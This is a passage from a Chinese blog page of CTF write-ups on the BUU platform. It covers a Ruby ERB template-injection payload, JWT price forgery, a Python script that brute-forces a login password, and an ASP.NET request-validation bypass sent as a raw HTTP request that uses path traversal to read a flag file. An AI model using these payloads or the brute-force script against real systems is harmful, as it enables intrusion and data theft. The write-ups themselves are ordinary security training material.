+<p>关键解题代码</p>
+<p><a target="_blank" rel="noopener" href='https://www.anquanke.com/post/id/86867'>Rudy ERB模板注入</a></p>
+<p>因为限制了字符，<code>&lt;%=%&gt;</code>传参，而这个固定式子已经使用了五个字符这里<br><code>$&#39;-最后一次成功匹配右边的字符串</code>正好有一个可以用<br>payload &#x3D; <code>/work?SERCET=&amp;do=&lt;%=$&#39;%&gt;&amp;name=&lt;%=$&#39;%&gt; is working</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230226204810.png" alt="20230226204810"></p>
+<p>url编码一下<code>/work?SERCET=&amp;do=%3C%25%3D%24&#39;%25%3E&amp;name=%3C%25%3D%24&#39;%25%3E%20is%20working</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230226210859.png" alt="20230226210859"></p>
+<p>没有回显,这个时候发现，我的<code>&#39;</code>没有编码重新来一下<br><code>/work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230226211139.png" alt="20230226211139"></p>
+<p>同样这里还有第二种解法,限制了字符为7那我们可以把do和name的参数设置为数组的形式来绕过字符限制<br>payload &#x3D; <code>/work?name[]=&lt;%=self%&gt;&amp;name[]=1&amp;name[]=2&amp;name[]=3&amp;name[]=4&amp;name[]=5&amp;name[]=6&amp;do=[&quot;&lt;%=self%&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working</code><br><code>/work?name[]=%3C%25%3Dself%25%3E&amp;name[]=1&amp;name[]=2&amp;name[]=3&amp;name[]=4&amp;name[]=5&amp;name[]=6&amp;do=%5B%22%3C%25%3Dself%25%3E%22%2C%20%221%22%2C%20%222%22%2C%20%223%22%2C%20%224%22%2C%20%225%22%2C%20%226%22%5D%20is%20working</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230226215831.png" alt="20230226215831"><br>但是没有sercet的回显.</p>
+<p>jwt 修改价格<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230226213050.png" alt="20230226213050"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">post &quot;/shop&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)</span><br></pre></td></tr></table></figure>
+<p>需要使用POST 传入伪造的jwt<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230226213154.png" alt="20230226213154"></p>
+<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><h5 id="网鼎杯-2018-Comment-lt-二次注入-gt"><a href="#网鼎杯-2018-Comment-lt-二次注入-gt" class="headerlink" title="[网鼎杯 2018]Comment &lt;二次注入&gt;"></a>[网鼎杯 2018]Comment &lt;二次注入&gt;</h5><p>点发帖，发现需要的登录<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230227162238.png" alt="20230227162238"></p>
+<p>密码就只有后三位不知到<br>bp爆破<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230227164950.png" alt="20230227164950"></p>
+<p>py脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://157553d9-c195-40e7-9cbe-ca870010c665.node4.buuoj.cn:81/login.php&quot;</span><br><span class="line"></span><br><span class="line">for i in range(100,1000):</span><br><span class="line">    password = &quot;zhangwei&quot; + str(i)</span><br><span class="line">    </span><br><span class="line">    data = &#123;&quot;username&quot;:&quot;zhangwei&quot;,&quot;password&quot;:password&#125;</span><br><span class="line"></span><br><span class="line">    r = requests.post(url=url,data=data)</span><br><span class="line">    if(r.status_code != 200):</span><br><span class="line">        time.sleep(2)</span><br><span class="line">    if( &#x27;error&#x27; in r.text or &#x27;429&#x27; in r.text):</span><br><span class="line">        print(i)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;here:&quot;+str(i))</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+
+<p>爆出来密码<code>zhangwei666</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230227163654.png" alt="20230227163654"></p>
+<p>试着发一个帖，开始想的是二次注入，但是二次注入之后，利用注入的语句我该往哪里用呢？</p>
+<p>扫一下常见目录。<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230227165223.png" alt="20230227165223"><br>只扫到了两个</p>
+<h5 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h5><p>sql预处理，写入shell</p>
+<h5 id="De1CTF-2019-Giftbox"><a href="#De1CTF-2019-Giftbox" class="headerlink" title="[De1CTF 2019]Giftbox"></a>[De1CTF 2019]Giftbox</h5><h5 id="Windows-HITCON-2019-Buggy-Net"><a href="#Windows-HITCON-2019-Buggy-Net" class="headerlink" title="[Windows][HITCON 2019]Buggy_Net"></a>[Windows][HITCON 2019]Buggy_Net</h5><p>重要源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bool isBad = false;</span><br><span class="line">   try &#123;</span><br><span class="line">       if ( Request.Form[&quot;filename&quot;] != null ) &#123;</span><br><span class="line">           isBad = Request.Form[&quot;filename&quot;].Contains(&quot;..&quot;) == true;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125; catch (Exception ex) &#123;</span><br><span class="line">       </span><br><span class="line">   &#125; </span><br><span class="line"></span><br><span class="line">   try &#123;</span><br><span class="line">       if (!isBad) &#123;</span><br><span class="line">           Response.Write(System.IO.File.ReadAllText(@&quot;C:\inetpub\wwwroot\&quot; + Request.Form[&quot;filename&quot;]));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125; catch (Exception ex) &#123;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目提示flag在c:&#x2F;FLAG.txt,肯定需要进行目录穿越,但是我们需要进入第二个异常的任意文件读取,需要让isBad参数为false,那就需要跳过isbad的赋值,触发异常。再传一个参数赋值为<code>&lt;!</code>，然后目录穿越读flag</p>
+<p><a target="_blank" rel="noopener" href="https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour">https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour</a></p>
+<p>发包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: node4.buuoj.cn:25203</span><br><span class="line">Content-Length: 37</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36</span><br><span class="line">Origin: http://node4.buuoj.cn:25203</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://node4.buuoj.cn:25203/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">filename=..%2F..%2FFLAG.txt&amp;ty=%3C%21</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个漏洞的基本思想是，对于POST请求，请求验证会阻止在POST表单字段中包含“危险内容”,例如HTML标签或类似的内容，如&lt;x，就是当我们传入这些内容，是html标签的时候，计算机会将这处理为危险内容 并终止整个应用程序。然后触发异常,然而，在查询字符串字段中相同的内容将通过初始请求验证，并且只有在首次访问Request.QueryString[…]时才会引发异常（因为该字段在首次访问时被填充）同样地，对于GET请求，请求验证会阻止在GET查询字符串字段中包含“危险内容”（例如HTML标签或类似的内容，如&lt;x），并终止整个应用程序。然而，在表单字段中相同的内容（即以application&#x2F;x-www-form-urlencoded编码为请求体）将通过初始请求验证，并且只有在首次访问Request.Form[…]时才会引发异常（再次提醒一下，该字段在首次访问时被填充）。尽管如此，在POST请求中可以通过Request.QueryString[…]来访问查询字符串字段，并且可以通过以application&#x2F;x-www-form-urlencoded格式提交到GET请求的请求体中来访问表单字段。因此，我们应该能够成功地提交表单，方法是发送一个没有任何查询字符串字段但具有文件名字段的GET请求。此外，在发送到服务器端口触发那个“延迟” 请求验证错误(或者说这是微软宣布不修复bug?)之前还要包括另一个触发器, 例如简单 &amp;o&#x3D;&lt;x 的形式, 我们应该能够在第一次访问 Request.Form[“filename”] 之前触发异常… 这正是我们需要逃离第一个try-catch块之前改变isBad.</p>
+</blockquote>
+<p>payload:<br><code>filename=../../FLAG.txt&amp;yt=&lt;!</code></p>
+<p><code>flag&#123;6a86280b-4bbd-424d-914e-82087e1bb0e6&#125;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128144215.png" alt="20231128144215"></p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/-f128e7dd768b5.jpg" alt="懒羊羊">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>懒羊羊
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2022/11/10/BUU/" target="_blank">BUU</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tags/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">buu刷题记录</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
+                    
+                        <a href="/2022/12/11/Java/" class="prev-prefix">« </a> 上一篇：    <a href="/2022/12/11/Java/" title="发布于 2022-12-11 08:52">Java</a>
+                        <br>
+                    
+                    
+                        <a href="/2022/11/08/Hackergame-2022/" class="next-prefix">» </a> 下一篇：    <a href="/2022/11/08/Hackergame-2022/" title="发布于 2022-11-08 07:29">Hackergame 2022</a>
+                    
+                </div>
+            </div>
+            
+    <div class="article-comments">
+        
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+
+        </div>
+    
+</div>
+    <div id="footer"></div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>简单地活着，肆意而又精彩！</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/-f128e7dd768b5.jpg">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user"><span>懒羊羊</span></div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="知乎" href="https://zhihu.com/people/worstone-29" class="" target="_blank" data=""><span class="iconfont icon-zhihu"></span></a>
+                
+                    <a name="微博" href="https://weibo.com/u/5749847477" class="" target="_blank" data=""><span class="iconfont icon-weibo"></span></a>
+                
+                    <a name="QQ" href="javascript:;" class="image" target="_self" data="/image/sidebar/qq.png"><span class="iconfont icon-qq"></span></a>
+                
+                    <a name="微信" href="javascript:;" class="" target="_self" data=""><span class="iconfont icon-wechat"></span></a>
+                
+                    <a name="GitHub" href="https://github.com/first19326" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+
+    
+        <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+        <script type="text/javascript" src="/js/APlayer.min.js"></script>
+        <script type="text/javascript" src="/js/Meting.min.js"></script>
+        <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+    
+    
+    <div class="wrap-right">
+        <div class="setting">
+            <div class="iconbox favorites" switch="false">
+                <span class="iconfont icon-favorites"></span>
+                <span class="icontext">关注</span>
+            </div>
+            <div class="iconbox mode">
+                <div class="light">
+                    <span class="iconfont icon-daymode"></span>
+                    <span class="icontext">浅色模式</span>
+                </div>
+                <div class="dark">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                    <span class="icontext">深色模式</span>
+                </div>
+            </div>
+            <a href="javascript:;" target="_self" class="search">
+                <div class="iconbox">
+                    <span class="iconfont icon-search-menu"></span>
+                    <span class="icontext">搜索</span>
+                </div>
+            </a>
+            <div class="iconbox bottom">
+                <div style="display: inline-block; transform: rotate(180deg);">
+                    <span class="iconfont icon-top"></span>
+                </div>
+                <span class="icontext">跳至底部</span>
+            </div>
+        </div>
+        <div class="iconbox set">
+            <div style="display: inline-block;">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="iconbox top">
+            <span class="iconfont icon-top"></span>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "Daylovef",
+        GitHubRepositories : "Hexo-LiveForCode",
+
+        User             : "懒羊羊",
+        UserAvatar       : "/image/sidebar/-f128e7dd768b5.jpg",
+        WebsiteStartDate : "2020-01-01",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) FYL is my girlfriend",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : "/image/website/logo.png",
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/51c6d5c3154ea2f0.jpg",
+            
+                "/image/header/home.jpg",
+            
+                "/image/header/home.jpeg",
+            
+        ],
+        HomeBannerText  : "",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.jpg",
+            
+        ],
+
+        OtherBannerText : "",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "简单地活着，肆意而又精彩！",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "赞赏",
+                    icon   : "icon-heart-fill",
+                    href   : "/donate",
+                    type   : "donate",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "订阅",
+                    icon   : "icon-rss",
+                    href   : "/atom.xml",
+                    type   : "",
+                    class  : "",
+                    target : "_blank"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "友情链接",
+                    icon   : "icon-link",
+                    href   : "/friend",
+                    type   : "friend",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "知乎",
+                        icon   : "icon-zhihu",
+                        href   : "https://zhihu.com/people/worstone-29",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "微博",
+                        icon   : "icon-weibo",
+                        href   : "https://weibo.com/u/5749847477",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "QQ",
+                        icon   : "icon-qq",
+                        href   : "javascript:;",
+                        class  : "image",
+                        target : "_self",
+                        image  : "/image/sidebar/qq.png"
+                    },
+                
+                    {
+                        name   : "微信",
+                        icon   : "icon-wechat",
+                        href   : "javascript:;",
+                        class  : "",
+                        target : "_self",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/first19326",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2022 WorstOne. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Based on cnblogs theme SimpleMemory.",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "SimpleMemory Author:",
+                            
+                                "BNDong",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "Theme:",
+                            
+                                "LiveForCode",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/alipay.png",
+            wechat  : "/image/donate/wechat.png"
+        },
+
+        Search : {
+            applicationID : "010C3EANT8",
+            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
+            indexName     : "Notes",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Valine : {
+            switch         : true,
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js"
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "简单地活着, 肆意又精彩."
+        },
+            
+        Theme : {
+            url  : "https://github.com/first19326/Hexo-LiveForCode",
+            name : "Hexo - Live For Code"
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
